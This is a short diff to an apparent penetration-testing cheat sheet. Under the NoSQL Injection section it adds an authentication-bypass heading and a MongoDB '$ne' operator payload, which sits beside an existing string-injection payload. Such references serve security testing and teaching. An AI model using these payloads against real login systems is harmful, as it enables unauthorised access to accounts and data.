@@ -310,8 +310,11 @@ $ mysqldump --databases <DATABASE> -u<USERNAME> -p<PASSWORD>    // no space betw
 
 ## NoSQL Injection
 
+### Authentication Bypass
+
 ```c
 admin'||''==='
+{"username": {"$ne": null}, "password": {"$ne": null} }
 ```
 
 ### Bruteforce Values
